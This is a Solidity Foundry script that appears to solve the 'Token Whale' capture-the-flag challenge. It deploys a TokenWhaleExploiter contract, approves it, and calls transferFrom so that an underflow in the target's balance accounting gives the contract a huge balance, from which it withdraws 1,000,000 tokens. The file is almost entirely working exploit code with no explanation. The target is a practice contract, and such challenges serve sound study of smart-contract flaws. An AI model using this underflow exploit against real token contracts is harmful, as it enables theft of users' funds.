// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface ITokenWhale {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external;

    function approve(address spender, uint256 value) external;

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external;
}

contract TokenWhaleSolution is Script {
    ITokenWhale private tokenWale = ITokenWhale(vm.envAddress("ADDRESS"));

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        TokenWhaleExploiter exploiter = new TokenWhaleExploiter(
            address(tokenWale)
        );

        tokenWale.approve(address(exploiter), 1 ether);
        exploiter.exploit();
        vm.stopBroadcast();
    }
}

contract TokenWhaleExploiter {
    address public owner;
    ITokenWhale public tokenWale;

    constructor(address _address) public {
        owner = msg.sender;
        tokenWale = ITokenWhale(_address);
    }

    function exploit() public {
        require(msg.sender == owner);
        tokenWale.transferFrom(owner, owner, 1);

        require(tokenWale.balanceOf(address(this)) >= 1000000);
        tokenWale.transfer(owner, 1000000);
    }
}
